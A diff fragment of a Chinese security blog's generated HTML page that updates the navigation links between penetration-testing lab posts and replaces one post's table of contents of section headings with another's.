-                <i class="fa fa-chevron-left"></i> LazySysAdmin渗透实战
+              <a href="/2019/08/16/DC-3/" rel="next" title="DC-3渗透实战">
+                <i class="fa fa-chevron-left"></i> DC-3渗透实战
               </a>
             
           </div>
@@ -689,10 +677,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/08/16/windows2008_1/" rel="prev" title="windows2008渗透测试（一）">
-                windows2008渗透测试（一） <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -843,7 +827,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#渗透"><span class="nav-number">2.</span> <span class="nav-text">渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#信息收集"><span class="nav-number">2.1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sql注入"><span class="nav-number">2.2.</span> <span class="nav-text">sql注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hash破解"><span class="nav-number">2.3.</span> <span class="nav-text">hash破解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GETSHELL"><span class="nav-number">2.4.</span> <span class="nav-text">GETSHELL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sf反弹shell"><span class="nav-number">2.5.</span> <span class="nav-text">sf反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#提权"><span class="nav-number">2.6.</span> <span class="nav-text">提权</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#拓展"><span class="nav-number">3.</span> <span class="nav-text">拓展</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Ubuntu开启ssh"><span class="nav-number">3.1.</span> <span class="nav-text">Ubuntu开启ssh</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Ubuntu用户管理-普通用户-gt-root"><span class="nav-number">3.2.</span> <span class="nav-text">Ubuntu用户管理(普通用户-&gt;root)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#John破解Linux密码教程"><span class="nav-number">3.3.</span> <span class="nav-text">John破解Linux密码教程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考文章"><span class="nav-number">4.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#环境"><span class="nav-number">1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#渗透"><span class="nav-number">2.</span> <span class="nav-text">渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#信息收集"><span class="nav-number">2.1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#容器探测"><span class="nav-number">2.2.</span> <span class="nav-text">容器探测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GETSHELL"><span class="nav-number">2.3.</span> <span class="nav-text">GETSHELL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#提权"><span class="nav-number">2.4.</span> <span class="nav-text">提权</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考文章"><span class="nav-number">3.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
             
 
           </div>
